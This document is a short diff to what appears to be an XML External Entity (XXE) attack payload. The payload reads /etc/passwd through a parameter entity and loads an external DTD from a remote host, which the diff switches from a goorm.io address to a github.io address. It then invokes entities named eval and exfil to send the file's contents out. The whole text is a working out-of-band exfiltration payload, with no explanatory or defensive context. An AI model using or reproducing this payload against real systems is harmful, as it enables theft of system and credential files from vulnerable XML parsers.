@@ -1,7 +1,7 @@
 <?xml version="1.0" ?>
 <!DOCTYPE x [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % dtd SYSTEM "https://ssrinctest.run.goorm.io/ssrinc.dtd">
+  <!ENTITY % dtd SYSTEM "https://phantom9586.github.io/SSRINC/ssrinc.dtd">
   %dtd;
   %eval;
   %exfil;
